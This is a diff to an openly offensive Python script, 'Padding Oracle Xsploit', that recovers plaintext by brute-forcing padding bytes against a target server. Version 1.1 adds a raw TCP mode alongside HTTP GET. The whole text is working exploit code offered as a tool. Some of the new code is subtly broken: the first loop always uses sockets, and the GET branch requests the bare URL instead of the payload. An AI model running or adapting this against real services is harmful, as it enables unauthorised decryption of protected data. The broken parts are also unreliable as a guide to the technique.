@@ -5,7 +5,7 @@ import itertools
 import sys
 from termcolor import colored
 import colorama
-import codecs
+import socket
 
 colorama.init()
 def mapping(x):
@@ -39,17 +39,26 @@ del iter_str[0]
 url  = str(input("Url  :"))
 hexa = str(input("Hex :"))
 block_size = int(input("Block size : "))
-error_msg = str(input("Error message :"))
+error_msg = str(input("Error message (default is 'Padding Error') :") or "Padding Error")
 f_b = str(input("Do you want to decode the first block ? [y/n] :") or "y")
-f_b = "n"
-if f_b != "y" or f_b != "n":
+method = str(input("Method (default is get) GET/TCP :") or "GET")
+
+
+
+if f_b != "y" and f_b != "n":
   f_b = "n"
+
 sort_hexa = [hexa[i:i+int(block_size *2)] for i in range(0,len(hexa),block_size *2)]
 
 print('Padding Oracle Xsploit by realbacon\n')
-print(colored(f"- Version 1.0\n- Target : {url}\n- Sample hex : {hexa}\n- Block lenght : {block_size}\n- Encode first block : {f_b}\n",'yellow'))
+print(colored(f"- Version 1.1\n- Target : {url}\n- Sample hex : {hexa}\n- Block lenght : {block_size}\n- Decode first block : {f_b}\n- Method : {method}\n",'yellow'))
 
-def decrypt(previous,block_to_decrypt):
+
+
+
+#Start of decrypt function
+def decrypt(host,port,previous,block_to_decrypt,method):
+  print(colored(f"[*] Binding to {url}:{port}\n","magenta"))
   re = []
   cut_block = []
   ref_block = [previous[i:i+2] for i in range(0,len(previous),2)]
@@ -69,10 +78,17 @@ def decrypt(previous,block_to_decrypt):
         send_encoded[k] = hex(int(kk,16) ^ int("".join(iter_str[i]),16))[2:] if kk != "00" else "00"
       send = list(map(mapping,send))
       send_encoded = list(map(mapping,send_encoded))
-      u = url + "".join(send_encoded) + block_to_decrypt
-      r = req.get(u)
+      u = "".join(send_encoded) + block_to_decrypt
+      try:
+        with socket.socket() as sock:
+          sock.connect((host, port))
+          sock.sendall(bytes(u,'utf-8') + b'\n')
+          get = sock.recv(512)
+          get = get.decode('utf-8')
+      except Exception as e:
+        print(colored(f"[-] Connection Error : {e}","red"))
 
-      if error_msg not in r.text:
+      if error_msg not in get:
         flag = True
         break
 
@@ -87,10 +103,25 @@ def decrypt(previous,block_to_decrypt):
           send_encoded[k] = hex(int(kk,16) ^ int("".join(iter_str[i]),16))[2:] if kk != "00" else "00"
         send = list(map(mapping,send))
         send_encoded = list(map(mapping,send_encoded))
-        u = url + "".join(send_encoded) + block_to_decrypt
-        r = req.get(u)
+        if method == "TCP":
+          try:
+            with socket.socket() as sock:
+              u = "".join(send_encoded) + block_to_decrypt
+              sock.connect((host, port))
+              sock.sendall(bytes(u,'utf-8') + b'\n')
+              get = sock.recv(512)
+              get = get.decode('utf-8')
+          except Exception as e:
+            print(colored(f"[-] Connection Error : {e}","red"))
+        elif method == "GET":
+          try:
+            u = url + "".join(send_encoded) + block_to_decrypt
+            r = req.get(url)
+            get = r.text
+          except Exception as e:
+            print(colored(f"[-] Connection Error : {e}","red"))
 
-        if error_msg not in r.text:
+        if error_msg not in get:
           flag = True
           break
     if flag == True:
@@ -98,11 +129,10 @@ def decrypt(previous,block_to_decrypt):
       p =  bytes.fromhex(j)
       try:
         p = str(p.decode('utf-8'))
-        print(colored("              - Encoding : utf-8","white"),end="\r")
+        print(colored(f"{14*' '}- Encoding : utf-8","white"),end="\r")
       except:
-        raise
         p = str(p)
-        print(colored("                     - Can' decode, probably not utf-8 : ","red"),end="\r")
+        print(colored(f"{21*' '}- Can' decode, probably not utf-8 : ","red"),end="\r")
         pass
       print(colored(f"[+] Char : {p}\n","cyan"))
       re.insert(0,p)
@@ -114,15 +144,24 @@ def decrypt(previous,block_to_decrypt):
 
   print("[+] Decoded value :","".join(re),"\n")
   return "".join(re)
+#End of decrypt function
+
 
 
 comp_arr = sort_hexa.copy()
 comp_arr.insert(0,comp_arr[0])
 start = 2 if f_b == "n" else 1
 final_res = []
-for i in range(start,len(sort_hexa)+1):
-  a=i-1
-  print("[*] Switching to block",i,'\n')
-  final_res.append(decrypt(comp_arr[a],comp_arr[i]))
+allow_methods = ["GET","TCP"]
+if method in allow_methods:
+  for i in range(start,len(sort_hexa)+1):
+    a=i-1
+    port = None
+    if method == "TCP":
+      port = int(input("Port to connect to :"))
+    print("[*] Switching to block",i,'\n')
+    final_res.append(decrypt(url,port,comp_arr[a],comp_arr[i],method))
 
-print(colored(f"Decoded block : {''.join(final_res)}",'green'))
+  print(colored(f"Decoded block : {''.join(final_res)}",'green'))
+
+
